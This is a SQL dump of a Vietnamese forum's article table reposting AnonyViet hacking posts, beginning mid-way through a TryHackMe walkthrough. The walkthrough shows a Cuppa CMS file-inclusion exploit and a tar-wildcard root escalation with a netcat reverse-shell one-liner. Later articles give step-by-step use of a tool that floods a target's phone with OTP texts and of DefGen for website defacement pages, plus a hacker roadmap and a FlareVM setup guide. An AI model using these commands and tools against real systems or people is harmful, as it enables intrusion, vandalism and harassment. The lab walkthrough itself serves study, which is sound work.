height:100%;\"><br>\r\n                            Tiếp theo đăng nhập vào ổ đĩa chia sẻ của Miles và xem chúng ta tìm được gì nào. Bạn sẽ thấy một tệp cung cấp cho bạn thông tin về CMS                             mới. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-29-07.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Truy cập CMS sẽ thấy trang Miles Dysons Personal :v. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-30-28.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Nếu bạn sử dụng GoBuster trên thư mục /45kra24zxs28v3yd/, bạn sẽ thông tin trang /administrator. Tada, chúng ta tìm được Cuppa CMS.                                <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-32-32.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Nhìn vào mã nguồn sẽ cho bạn dấu hiệu về phiên bản của CMS. Sau một vài lần search google, thì mình tìm thấy cách khai thác công khai                              nó: https://www.exploit-db.com/exploits/25971 <br>\r\n                            Lấy một tập lệnh shell và thay đổi IP thành IP tun0 của bạn (ifconfig), lưu trữ cục bộ bằng Python, sử dụng netcat để lắng nghe                                    session và sau đó đưa shell này lên máy chủ web. <br>\r\n                            Ảnh bên dưới sẽ giải thích các bước chính xác để có được shell đặc quyền thấp bằng cách khai thác lỗ hổng RFI! Bạn có thể tải reverse                              shell PHP từ PentestMonkey. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-54-09.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Trong code CMS, có một đoạn code PHP bao gồm tệp (File include): <br>\r\n                            <code>&lt</code><br>\r\n                            Tuy nhiên, điều này cũng cho phép ta bao gồm các shell của riêng mình (hoặc thậm chí bao gồm một tệp trên hệ thống như /etc/passwd).                               Để có giải thích chi tiết hơn, bạn vui lòng đọc tài liệu này. <br>\r\n                            Bây giờ chúng ta đã có shell, vậy nên có thể lấy user flag. Bước tiếp theo là nâng cấp đặc quyền của chúng ta để root. <br>\r\n                            Khi liệt kê máy Linux, mình thấy có một số cronjob đang chạy. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-58-08.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Vì vậy, tệp /home/milesdyson/backups/backup.sh đang được gọi mỗi phút. Kiểm tra tệp này chút nào: <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-18-00-15.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Lại thêm một shell nữa, truy cập đến thư mục /var/www/html và tạo một bản sao lưu của mọi thứ trong thư mục. <br>\r\n                            Dù bạn tin hay không thì điều này sẽ tạo ra một lỗ hổng vì chúng ta có thể sử dụng nó để thực thi code. HelpNetSecurity giải thích rõ                              nhất cách thức hoạt động của lỗ hổng này, nhưng về bản chất, tar có các ký tự đại diện và chúng ta có thể sử dụng điều này  để thực                                hiện các lệnh. <br>\r\n                            <code>\r\n                                echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <code><your ip></code><br>\r\n                                    1234 >/tmp/f\" > shell.sh <br>\r\n                                    touch \"/var/www/html/--checkpoint-action=exec=sh shell.sh\" <br>\r\n                                    touch \"/var/www/html/--checkpoint=1\" <br>\r\n                            </code><br>\r\n                            Sau đó, mở netcat và bạn sẽ nhận được một shell dưới dạng root. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-18-17-13.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Bạn cũng có thể đọc thêm cách giải bài Shodan trên Tryhackme tại đây. <br><br>\r\n                        </p>\r\n                    </aside>\r\n                </article><br>\r\ncopyright by:AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(6, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3 id=\"textTin\">Lộ trình để trở thành Hacker thực thụ</h3>\r\n                        <p>\r\n                            Học gì để trở thành Hacker <br>\r\n                            Bạn có phải là người quan tâm và muốn tham gia vào lĩnh vực an ninh mạng và bạn muốn người ta gọi bạn là Hacker. Nhưng bạn chưa biết bắt đầu từ đâu, bài viết này sẽ đưa ra lộ trình để trở thành Hacker thực thụ, bạn có thể tham khảo để biết nên học từ môn nào đầu tiên.\r\n                        </p>\r\n                        <img src=\"Imageass/lo-trinh-tro-thanh-hacker.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        <h1>Ethical Hacker – Hacker đạo đức – Hacker Mũ trắng là gì?</h1>\r\n                        <p>\r\n                            Hacker là người có thể truy cập trái phép vào bất kỳ hệ thống máy tính nào mà không được phép, chẳng hạn như dùng phương pháp Social Engineering hoặc có một số tài liệu, file, password, v.v. trước đó và tất nhiên điều này là bất hợp pháp. <br>\r\n                            Song song với thế lực Hacker bất hợp pháp thì trên thế giới vẫn có lực lượng Hacker Mũ trắng là những người được mời/thuê để có thể kiểm tra bảo mật đối với hệ thống/mạng máy tính, v.v. Do đó các Hacker mũ trắng được chủ công ty cho phép thử nghiệm như: mã độc, lỗ hổng, lỗ hổng bảo mật tiềm ẩn của hệ thống máy tính. <br>\r\n                            Bây giờ chúng ta sẽ đi sâu vào Lộ trình để trở thành Hacker thì nên học những gì và điều gì giúp bạn trở thành một Hacker giỏi?\r\n                        </p>\r\n                        <h1>Lộ trình để trở thành Hacker thực thụ</h1>\r\n                        <p>\r\n                            Có nhiều lộ trình để bạn thành Hacker, đây chỉ là 1 số những con đường giúp bạn trở thành Hacker thực thụ. Bạn có thể tham khỏa roadmap này, nó cũng tương ứng với lộ trình học đại học <br>\r\n                            +)Lập trình và khoa học máy tính <br>\r\n                            +)Nguyên tắc cơ bản về mạng và hệ điều hành <br>\r\n                            +)Bảo mật ứng dụng <br>\r\n                            +)Chọn chuyên ngành yêu thích của bạn, chẳng hạn như: bảo mật nhị phân, bảo mật ứng dụng web (sau này làm bug hunter – sợ săn kiếm tiền thưởng) <br>\r\n                            +)Mobile forensics, pentesting, bảo mật ứng dụng <br>\r\n                            +)An ninh mạng – Network Security – Học mô hình mạng – Triển khai hệ thống mạng <br>\r\n                            +)Đội đỏ – Red Team <br>\r\n                            +)Đội xanh – Blue Team <br>\r\n                            Bây giờ chúng ta sẽ đi sâu vào chi tiết từng phần nhé.\r\n                        </p>\r\n                        <h1>Lập trình và khoa học máy tính</h1>\r\n                        <p>\r\n                            Bất cứ Lộ trình để trở thành Hacker đều phải có kiến thức về Code. Hầu hết mọi người không thích lập trình, đa số mọi người bây giờ thường dùng công cụ có sẵn để tấn công hay rà quét lỗ hổng hệ thống (Metasploit, nuclei, Burp Suite) nhưng đừng quên các kỹ năng tốt nhất đến từ các Lập trình và khoa học máy tính <br>\r\n                            Thật sự một Hacker giỏi nhất thường xuất phát từ nền tảng lập trình viên, họ hiểu cú pháp của đoạn Code đó viết về vấn đề gì, lỗ hổng nằm trong Code chỗ nào. Trong đầu họ đã mường tượng được cách thức hoạt động của phần mềm hoặc có thể tạo công cụ Hack của riêng mình (RAT, Worm, Virus) và điều quan trọng là phải có kiến ​​thức về bất kỳ ngôn ngữ lập trình nào (không bắt buộc). Có rất nhiều khóa học mình đã chia sẻ chỉ cần chọn một ngôn ngữ lập trình và bắt đầu học.\r\n\r\n                        </p>\r\n                        <h1>Vậy nên học ngôn ngữ nào để Hack được?</h1>\r\n                        <p>\r\n                            Trong Lộ trình để trở thành Hacker này, mình sẽ giải thích ngôn ngữ nào nó làm gì và mục đích nào có thể được thực hiện? <br>\r\n                            – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – <br>\r\n                            Ngôn ngữ: HTML (không hẵn là ngôn ngữ lập trình) <br>\r\n                            Mục đích: hack web <br>\r\n                            Form đăng nhập và các phương thức nhập dữ liệu trên web sử dụng HTML để lấy dữ liệu <br>\r\n                            – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – <br>\r\n                            Ngôn ngữ: Javascript <br>\r\n                            Mục đích: Hack web <br>\r\n                            JavaScript là ngôn ngữ thực sự mạnh mẽ, có thể lấy cookie người dùng khác và nó có thể được thực thi trên trình duyệt của người khác <br>\r\n                            – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – <br>\r\n                            Ngôn ngữ: SQL <br>\r\n                            Mục đích: Hack web <br>\r\n                            Với ngôn ngữ này, bạn có thể truy cập dữ liệu phần mềm, web, biểu mẫu đăng nhập… thông qua lỗi SQL Injection <br>\r\n                            – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – <br>\r\n                            Ngôn ngữ: Python, Ruby, Bash, Perl <br>\r\n                            Mục đích: tạo phần mềm, tập lệnh <br>\r\n                            Những ngôn ngữ này là ngôn ngữ yêu thích của mình vì bạn có thể tạo ra những Tool, Code riêng để phù hợp với từng hệ thống khác nhau. Chẵng hạn như tấn công Brute Force, Man-in-the-Middle, v.v. và nó rất hữu ích để hiểu và tùy chỉnh các công cụ và tập lệnh đã được tạo <br>\r\n                            – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – <br>\r\n                            Ngôn ngữ: C/C++ <br>\r\n                            Mục đích: viết tool khai thác, phần mềm độc hại, mã shell <br>\r\n                            Hai ngôn ngữ này cũng là ngôn ngữ yêu thích của nhiều Hacker lão làng, tuy nhiên khó hơn nhiều so với Python, v.v.. bạn có thể tạo rootkit, khai thác, phần mềm độc hại của riêng mình, v.v. <br>\r\n                            – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – <br>\r\n                        </p>\r\n                        <h1>An ninh mạng</h1>\r\n                        <p>\r\n                            Bạn cũng cần phải tìm hiểu sâu hơn về lĩnh vực này vì mọi hệ thống đều phải hoạt động với internet để giao tiếp với nhau. Tìm hiểu về mô hình OSI, lỗ hổng bảo mật, v.v.. sau phần này, bạn sẽ học được nhiều điều về hack WIFI và Hack Server hoặc PC trong mạng nội bộ.\r\n                        </p>\r\n                        <h1>Bảo mật ứng dụng di động</h1>\r\n                        <p>\r\n                            Trong lĩnh vực này, bạn sẽ tìm hiểu mọi thứ về bảo mật, phần cứng, phần mềm của điện thoại nhằm phục vụ điều tra số. <br>\r\n                            Trong lĩnh vực này, bạn sẽ tìm hiểu về IOS, Android, v.v., bạn nên tập trung tìm hiểu về các tính năng bảo mật của hệ điều hành di động hiện đại. <br>\r\n                            Tuy nhiên ở Việt Nam chỉ có một số ít đơn vị đào tạo mảng này và thị trường việc làm chủ yếu là các công ty nước ngoài hoặc cơ quan có chức năng điều tra số.\r\n                        </p>\r\n                        <h1>Hiểu về mật mã – mã hóa</h1>\r\n                        <p>\r\n                             Phần này đặc biệt quan trọng vì hầu hết thông tin bảo mật đều được mã hóa nên nó đề cập và xuất phát từ các khái niệm toán học và nó là loại tính toán dựa trên quy tắc được gọi là thuật toán để chuyển đổi nội dung theo cách khó giải mã. <br>\r\n                        Bạn sẽ học qua các cách mã hóa và giải mã dữ liệu.\r\n                        </p>\r\n                        <h1>Bảo mật ứng dụng web</h1>\r\n                        <p>\r\n                            Trong phần này, bạn nên tập trung vào các lỗ hổng bảo mật tiềm ẩn thường ảnh hưởng đến ứng dụng web và là kỹ sư bảo mật web, bạn sẽ có thể hiểu CVE, cơ chế hoạt động web, v.v. <br>\r\n                            Để  thành một người Pentester giỏi, bạn nên thực hành nhiều có rất nhiều trang web kiểm tra web miễn phí như: OWASP, DVWA, JUICE, v.v. và để hiểu cơ chế bảo mật web, bạn nên tìm hiểu và hiểu về 10 lỗ hổng hàng đầu của OWASP.\r\n                        </p>\r\n                        <h1>Kỹ năng giao tiếp – Kỹ năng mềm – Kỹ năng viết Report</h1>\r\n                        <p>\r\n                            Trong lộ trình trở thành Hacker thực thụ, bạn cần phải thường xuyên trao đổi kinh nghiệm và đặt câu hỏi thắc mắc với nhóm (Team), đối tác của mình, điều cực kỳ quan trọng để có lĩnh vực này vì là một Hacker, bạn phải viết báo cáo về các lỗ hổng mà bạn đã tìm thấy và phải chia sẻ kiến ​​thức kỹ thuật của mình cho khách hàng có thể hiểu được mức nghiêm trọng của lỗ hổng ở hệ thống. <br>\r\n                            Nội dung bài viết Report về lỗ hổng bảo mật phải rõ ràng, dễ hiểu và ngắn gọn nhất có thể.\r\n                        </p>\r\n                        <h1>Học cách sử dụng các Tool Hack</h1>\r\n                        <p>\r\n                            Tất nhiên là dùng Tool sẽ nhanh hơn dùng tay, bạn cũng nên tìm hiểu một số Tool Recon, Tool Check lỗ hổng phổ biến để tiết kiệm trong quá trình lấy dấu vết hệ thống hoặc kiểm thử hệ thống. <br>\r\n                            Tool chỉ giúp ta tiết kiệm thời gian, chứ không giúp bạn nhanh chóng trở thành Hacker. Một Hacker thực thụ là phải biết hệ thống đó bị lỗi ở chỗ nào? Tại sao nó bị lỗi và cách khai thác như thế nào? Và cách sửa lỗi như thế nào?\r\n                        </p>\r\n                        <h1>Làm một số bài tập và ghi lại kinh nghiệm đã làm</h1>\r\n                        <p>\r\n                            Song song với học lý thuyết bạn nên thực hành trên chính hệ thống của mình hoặc các bài Lab của TryHackMe, Hack The Box… Sau đó tự rút ra kinh nghiệm sau mỗi lần hoàn thành xong bài Lab. Như thế kinh nghiệm sẽ được tích lũy dẫn cho đến khi bạn gặp được một hệ thống bị lỗi ở ngoài đời thực và dùng kiến thức đã có thể kiểm thử và tấn công. Hy vọng với Lộ trình để trở thành Hacker trên, bạn sẽ có cái nhìn tổng quan để biết mình nên học gì và làm gì để đi không bị chệch hướng.\r\n                        </p>\r\n                    </aside>\r\n                </article><br>\r\ncopyright by: AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(7, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3 id=\"textTin\">Hướng dẫn tạo trang Deface HTML bằng DefGen</h3>\r\n                        <p>\r\n                            Các bạn là hacker và đã tìm được cách thay đổi file HTML của 1 Website nào đó? Bạn muốn tấn công Deface tới 1 website nào đó mà bạn không nghĩ ra nên thay đổi gì khi làm 1 cuộc tấn công như vậy? Vậy thì Tool mà mình sắp giới thiệu sau đây có thể giúp các bạn tạo Deface HTML chỉ trong vòng vài giây sử dụng Python. Và tool ngày hôm nay có tên DefGen. Bắt đầu tìm hiểu cùng mình nhé!\r\n                        </p>\r\n                        <h1>Deface là gì?</h1>\r\n                        <img src=\"Imageass/website-defacement.jpg\">\r\n                        <p>\r\n                            Deface được định nghĩa là tấn công thay đổi nội dung, thông qua một điểm yếu nào đó, hacker sẽ thay đổi nội dung website của nạn nhân (bao gồm thay đổi HTML , CSS hay Javascript của website đó). Việc thay đổi nội dung này nhằm một số mục đích như sau : <br>\r\n                            +)Mục đích tốt: cảnh báo quản trị viên biết website đang tồn tại lỗ hỏng bảo mật cần phải sửa <br>\r\n                            +)Mục đích không đẹp: chứng tỏ năng lực bản thân, thường là những script kiddle hoặc những hacker mới học <br>\r\n                            +)Mục đích xấu: thù hằn, nội dung thay đổi thường là lăng mạ nạn nhân hoặc nội dung liên quan đến chính trị, tôn giáo và những vấn đề khác.\r\n                        </p>\r\n                        <h1>Tool DefGen để làm gì?</h1>\r\n                        <p>\r\n                            Khi các bạn đã có khả năng chỉnh sửa website rồi mà bạn chưa biết để sao cho đẹp hay cho ngầu và đồng thời bạn muốn nhắn nhủ tới các quản trị viên của Website đó biết rằng họ đang gặp 1 lỗ hổng nghiêm trọng thì bạn sẽ cần tới 1 File html chứa những lời nhắn nhủ trong đó. Và Defgen sẽ hỗ trợ bạn để tạo ra 1 file HTML cực ngầu và để cho các Website Developer biết và sửa website của họ\r\n                        </p>\r\n                        <h1>Hướng dẫn sử dụng Defgen</h1>\r\n                        <p>\r\n                            Defgen về bản chất là 1 file python tạo 1 file HTML bao gồm cả CSS và Javascript. Yêu cầu để chạy được bao gồm: <br>\r\n                            -Sử dụng trên máy tính hoặc điện thoại (Linux hoặc Termux) <br>\r\n                            -Trên máy có sử dụng Python 2 (Nếu các bạn chưa có thì mình sẽ hướng dẫn ở phía bên dưới nhé) <br>\r\n                            Và bây giờ mình sẽ hướng dẫn các bạn cách để sử dụng Defgen <br>\r\n                            Bước 1: (Đối với các bạn chưa có Python2) các bạn hãy chạy câu lệnh sau: <br>\r\n                            +)Termux: pkg update -y&&pkg upgrade -y;pkg install python2 <br>\r\n                            +)Linux: sudo apt update -y&&sudo apt upgrade -y;sudo apt install python2 <br>\r\n                            Bước 2: Các bạn tải file về tại đây hoặc chạy câu lệnh sau: <br>\r\n                            git clone https://github.com/anonyvietofficial/DefGen.git <br>\r\n                            Bước 3: Các bạn sử dụng câu lênh cd để vào thư mục vừa tải về. Đối với các bạn tải theo link thì hãy giải nén nó bằng cách sau: <br>\r\n                            <code>#câu lệnh unzip <br>\r\n                            unzip DefGen-main <br>\r\n                            #câu lệnh vào thư mục <br>\r\n                            cd DefGen <br>\r\n                            </code> <br>\r\n                            Bước 4: Các bạn chạy chương trình bằng câu lệnh sau: <br>\r\n                            python2 DefGen hoặc python DefGen <br>\r\n                            Bước 5: Họ sẽ bắt các bạn nhập thông tin, dưới đây là mẫu thứ tự nhập của mình <br>\r\n                        </p>\r\n                        <img src=\"Imageass/a-18.jpg\">\r\n                        <p>\r\n                            Trong này sẽ bao gồm: <br>\r\n                            + Hacker name: Tên của hacker <br>\r\n                            + Logo link: đường dẫn tới logo của bạn. <br>\r\n                            + Team name: tên đội của bạn <br>\r\n                            Sau khi xuất ra thì nếu bạn sử dụng termux thì nó sẽ xuất ra thư mục download của máy bạn. Nếu sử dụng kali linux thì nó sẽ trả file HTML về file DefGen <br>\r\n                            Kết quả: <br>\r\n                        </p>\r\n                        <img src=\"Imageass/a-19.jpg\">\r\n                        <p>Chúc các bạn thành công!</p>\r\n                    </aside>\r\n                </article><br>\r\ncopyright by:AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(8, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3 id=\"textTin\">Cách cài đặt FlareVM trên VirtualBox</h3>\r\n                            <p>\r\n                                Trong bài viết này, mình sẽ hướng dẫn các bạn cài đặt FlareVM; một bản phân phối bảo mật dựa trên Windows mã nguồn mở và miễn phí được thiết kế cho:\r\n                                +) Kỹ sư dịch ngược (RE)\r\n                                +) Nhà phân tích phần mềm độc hại\r\n                                +) Người ứng phó sự cố\r\n                                +) Người kiểm tra thâm nhập\r\n                            </p>\r\n                            <img src=\"imageass/1_dc_xYmmBtTPbBwvGAkaXtA.jpeg\" alt=\"\">\r\n                            <p>\r\n                                Cách thông thường để thiết lập phòng thí nghiệm của mình là cài đặt nó trên Máy ảo (Windows 7+ với ít nhất 60GB ổ cứng và 2GB RAM) để phần mềm độc hại không thể phá hoại hệ thống.\r\n                            </p>\r\n                            <h1>FlareVM là gì</h1>\r\n                            <p>\r\n                                FLARE VM là bản phân phối bảo mật dựa trên Windows có mã nguồn mở và miễn phí được thiết kế cho các kỹ sư dịch ngược, nhà phân tích phần mềm độc hại, người ứng phó sự cố, pháp y số và người kiểm tra thâm nhập. Lấy cảm hứng từ các bản phân phối bảo mật dựa trên Linux mã nguồn mở như Kali Linux, REMnux và những distro khác, FLARE VM cung cấp một nền tảng được cấu hình đầy đủ với các công cụ bảo mật của Windows như trình gỡ lỗi, trình tháo gỡ, trình dịch ngược, tiện ích phân tích tĩnh và động, phân tích mạng và thao tác, đánh giá web, khai thác, đánh giá lỗ hổng bảo mật và nhiều ứng dụng khác.\r\n                                Bản phân phối cũng bao gồm các công cụ phân tích phần mềm độc hại công khai của nhóm FLARE như FLOSS và FakeNet-NG.\r\n                            </p>\r\n                            <h1>Cách cài đặt FlareVM trên VirtualBox</h1>\r\n                            <h3>Lấy các tập tin</h3>\r\n                            <p>\r\n                                Bước đầu tiên là truy cập kho lưu trữ chính thức của FlareVM từ tính của bạn, nhấp vào ‘Code’ và chọn ‘Download Zip’. (Bạn cũng có thể sao chép kho lưu trữ bằng git).\r\n                            </p>\r\n                            <img src=\"imageass/1_J3Z5lFAS5rmNfXJjIOFVgg.jpeg\" alt=\"\">\r\n                            <p>\r\n                                Sau đó, bạn sẽ có một thư mục đã nén trong thư mục Download, hãy giải nén nội dung của nó bằng cách nhấp chuột phải và chọn “Extract all”.\r\n                                Tại thời điểm này, bạn sẽ thấy màn hình sau, chỉ cần nhấp vào “Extract”.\r\n                            </p>\r\n                            <img src=\"imageass/1_T1YWznIdDj_VXHrkdbNPCg.jpeg\" alt=\"\">\r\n                            <p>\r\n                                Theo tùy chọn, bạn có thể di chuyển toàn bộ thư mục vào một nơi thoải mái hơn như ngay bên dưới “C:\\”.\r\n                            </p>\r\n                            <h1>Chạy script</h1>\r\n                            <p>\r\n                                Trong số các tệp trong kho lưu trữ, có một tập lệnh tên là “install”, tập lệnh này sẽ thực hiện toàn bộ công việc cho chúng ta.\r\n                                Khi tìm thấy tập lệnh đó, chúng ta cần sao chép đường dẫn đầy đủ của tập lệnh install như ảnh bên dưới.\r\n                            </p>\r\n                            <img src=\"imageass/1_X7XIt_9fPOu1VEnI8jZmhA.jpeg\" alt=\"\">\r\n                            <p>\r\n                                Bước tiếp theo là vào Start Menu, tìm kiếm ‘Windows Powershell’ và chọn ‘Run as administrator’.\r\n                            </p>\r\n                            <img src=\"imageass/1_jluwSyfU0Sl0HrcHjgd3gg.jpeg\">\r\n                            <p>\r\n                                Khi Powershell đang hoạt động, hãy nhập ‘cd’ và dán đường dẫn đã sao chép và nhấn Enter. Nó thay đổi thư mục hiện tại thành thư mục của FlareVM.\r\n                            </p>\r\n                            <img src=\"imageass/1_suYnxtEF4QODuaQi9IYIBQ.jpeg\">\r\n                            <p>\r\n                                Bây giờ, hãy nhập ‘Set-ExecutionPolicy unrestricted‘ và nhấn Enter. Hệ thống sẽ yêu cầu bạn xác nhận về việc thay đổi chính sách thực thi, hãy nhập ‘Y’ và nhấn enter.\r\n                                Đã đến lúc chạy tập lệnh, hãy nhập “.\\install.ps1” (chỉ phần in đậm, không có dấu ngoặc kép) và nhấn Enter. Tại thời điểm này, nó sẽ yêu cầu xác nhận lại nếu bạn muốn chạy script không đáng tin cậy, bạn chỉ cần nhấn phím “R” và Enter.\r\n                                Sau đó, nhấp vào ‘Y’ khi nó yêu cầu xác nhận để tiếp tục nếu dung lượng ổ đĩa nhỏ hơn 40GB.\r\n                            </p>\r\n                            <img src=\"imageass/1_dFFWP1FYXTcw8SQK247VWQ.jpeg\">\r\n                            <p>\r\n                                Quá trình cài đặt sẽ tự động bắt đầu. Có thể mất 1-3 giờ để cài đặt.\r\n                            </p>\r\n                            <h1>Kết quả</h1>\r\n                            <p>\r\n                                Khi quá trình cài đặt FlareVM hoàn tất, bạn có thể nhận thấy một số điểm khác biệt:\r\n                                +) Hình nền máy tính được thay đổi thành Logo của FlareVM\r\n                                +) Máy tính để bàn có một thư mục tên là “FLARE” chứa hầu hết các công cụ miễn phí mà bạn sẽ sử dụng trong sự nghiệp an ninh mạng của mình.\r\n                            </p>\r\n                            <img src=\"imageass/1_yER1q2JEsy4Lfq2XB5KqdA.jpeg\" alt=\"\">\r\n                    </aside>\r\n                </article><br>\r\ncopyright by: AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(9, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3 id=\"textTin\">Hướng dẫn sử dụng tool spam SMS OTP V3</h3>\r\n                            <p>\r\n                                Không biết nhiều bạn đang đọc bài viết này đã bị dính những cái SMS quảng cáo mang tính chất spam chưa? Mình thì bị khá nhiều và thực sự lần nào mình bị cũng rất là khó chịu bởi vì nó cứ đến liên tục và dồn dập. Và sau khi tìm hiểu 1 chút thì mình đã phát hiện ra 1 tool cho phép mình spam OTP tới 1 số điện thoại nhất định. Và tất nhiên việc biết về 1 công cụ thực hiện hành vi xấu sẽ biết cách để phòng tránh nó nên hôm nay mình quyết định sẽ share tool này tới mọi người.\r\n                            </p>\r\n                            <h1>Khái niệm về spam SMS</h1>\r\n                            <p>\r\n                                Spam SMS cũng tương tự như Spam mail, là hình thức gửi tin nhắc rác đến điện thoại người khác. Có nhiều mục đích để spam sms như trêu chọc bạn bè, phát tán tin nhắn quảng cáo, lừa đảo…\r\n                            </p>\r\n                            <img src=\"imageass/phan-mem-spam-sms.jpg\" alt=\"\">\r\n                            <p>\r\n                                Thông thường sẽ có 2 cách để spam tin nhắn chính mà mọi người thường sử dụng:\r\n                                +)Cách đầu tiên là chạy thủ công. Bạn sẽ tự nhập và tự gửi tin nhắn với nội dung bạn mong muốn cho nhiều người.\r\n                                +)Cách thứ hai là sử dụng tool để gửi tin nhắn. Tool này sẽ có tập hợp của 1 loạt số điện thoại hoặc 1 dạng botnet có điện thoại để spam.\r\n                            </p>\r\n                            <h1>Hướng dẫn cài đặt và sử dụng  tool Spam OTP</h1>\r\n                            <h3>Lưu ý: Việc chia sẻ tool này chỉ mang tính chất giáo dục. Anonyviet sẽ không chịu trách nhiệm cho bất kì hành động và hậu quả của các bạn. Mình xin cảm ơn</h3>\r\n                            <p>\r\n                                Tool Spam SMS này sử dụng API của các trang Web khi gửi xác thực OTP để gửi cho số điện thoại nạn nhân, khi nhập số điện thoại người bị Spam họ sẽ liên tục nhận mã xác nhận từ các trang Web lớn như thegioididong, dienmayxanh…\r\n                                Chỉ sử dụng Tool để nghiên cứu ,học tập, không được spam người khác nhé.\r\n                            </p>\r\n                            <h1>Cài đặt sử dụng source code</h1>\r\n                            <p>\r\n                                Yêu cầu: Các bạn cần phải có python 3, pip 3 và git\r\n                                Bước 1: Các bạn tiến hành tải gói file về bằng lệnh git dưới đây\r\n                                <code>git clone https://github.com/cochyhung/SPAM-SMS-OTP.git</code>\r\n                                Bước 2: Các bạn sử dụng pip để tải package requests về máy bằng lệnh dưới đây\r\n                                <code>pip install requests</code>\r\n                                Bước 3: Các bạn sử dụng lệnh cd để đi tới thư mục của tool\r\n                                <code>cd SPAM-SMS-OTP</code>\r\n                                Bước 4: Các bạn chạy file spam.py. Trên Termux cũng có thể làm được nhé!\r\n                                <code>python spam.py</code> hoặc  <code>python3 spam.py</code>\r\n                            </p>\r\n                            <h1>Hướng dẫn sử dụng file Exe</h1>\r\n                            <p>\r\n                                Bước 1: Các bạn truy cập vào <a href=\"https://github.com/cochyhung/SPAM-SMS-OTP\"> github</a> và tiến hành tải file bằng cách chọn vào code > Download ZIP\r\n                            </p>\r\n                            <img src=\"imageass/a-2.jpg\" alt=\"\">\r\n                            <p>\r\n                                Bước 2: Giải nén file vừa tải về\r\n                                Bước 3: Vào file và chạy file có tên: spam.exe\r\n                            </p>\r\n                            <h1>Hướng dẫn sử dụng</h1>\r\n                            <img src=\"imageass/a-3.jpg\" alt=\"\">\r\n                            <p>\r\n                                Các bạn cần điền 2 thông tin như sau:\r\n                                Phone Number: Số điện thoại của mục tiêu\r\n                                Time delay: thời gian delay giữa các lần gửi. Thời gian được tính theo giây\r\n                                Có thể bạn cũng muốn xem: <a href=\"https://anonyviet.com/impulse-bo-cong-cu-ddos-spam-email-sms-cua-hacker-mu-den/\"> Impulse – Bộ công cụ DDOS, Spam Email, SMS của Hacker mũ đen</a>\r\n                            </p>\r\n                            <h1>Update Tool Spam OTP SMS V3</h1>\r\n                            <p>\r\n                                Nếu 2 Tool trên không  hoạt động được, bạn có thể dùng Tool Spam OTP version 3 mới nhất.\r\n                                <a href=\"https://www.fshare.vn/file/MKOH3Q7FAU88?token=1686924177\"> Tải Tool Spam OTP V3 </a>\r\n                                Các bạn cần cài đặt python trước.\r\n                                Sau đó mở cmd gõ lệnh:\r\n                                <code>pip install pystyle</code>\r\n                                <code>python spam_otp_v3.py</code>\r\n                                Nhập số điện thoại cần spam, lưu ý không điền số 0\r\n                                Chờ xíu cho Tool chạy sẽ thấy hàng loạt SMS được gửi đến điện thoại của bạn.\r\n                            </p>\r\n                    </aside>\r\n            </article><br>\r\n            copyright by:AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(10, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3 id=\"textTin\">9 điều tuyệt đối nên tránh khi dùng Tor</h3>\r\n                        <p>\r\n                        Internet luôn tiềm ẩn nguy cơ bị theo dõi hay bị rò rỉ dữ liệu cá nhân. Nếu bạn không muốn như vậy thì chỉ có một cách là ẩn danh trong khi sử dụng internet với sự trợ giúp của các công cụ có sẵn. Như VPN, TOR hoặc bạn có thể sử dụng máy chủ proxy để ẩn danh.<br>\r\n                        </p>\r\n                        <img src=\"images2/Tor-Browser-Is-It-Really-Anonymous.jpg\">\r\n                        <p>\r\n                            Trong số các tùy chọn có sẵn này, TOR là ứng cử viên nổi bật đầu tiên khi chúng ta so sánh về mức độ ẩn danh. Nhiều người coi dự án The Onion Router là chiếc áo choàng tốt nhất cho những kẻ muốn ẩn mình trên internet.<br>\r\n                            Edward Snowden, người bị đưa ra ánh sáng sau khi tố giác và vạch trần các hoạt động giám sát phi đạo đức của NSA, đã sử dụng trình duyệt TOR để làm điều đó. Các cơ quan liên bang cũng buộc tội và cáo buộc rằng việc anh ta tiết lộ thông tin mật là động lực đằng sau vụ thảm sát ở Paris.<br>\r\n                            Onion Router có sức mạnh để bảo vệ và che giấu bạn khỏi tất cả những kẻ xấu xa theo dõi bạn trên internet. Ngay cả khi bạn muốn trở thành một Edward Snowden phiên bản khác, bạn cũng có thể làm như vậy bằng cách sử dụng trình duyệt TOR.\r\n                        </p>\r\n                        <h1>Tor có an toàn không? Nó có thực sự ẩn danh?</h1>\r\n                        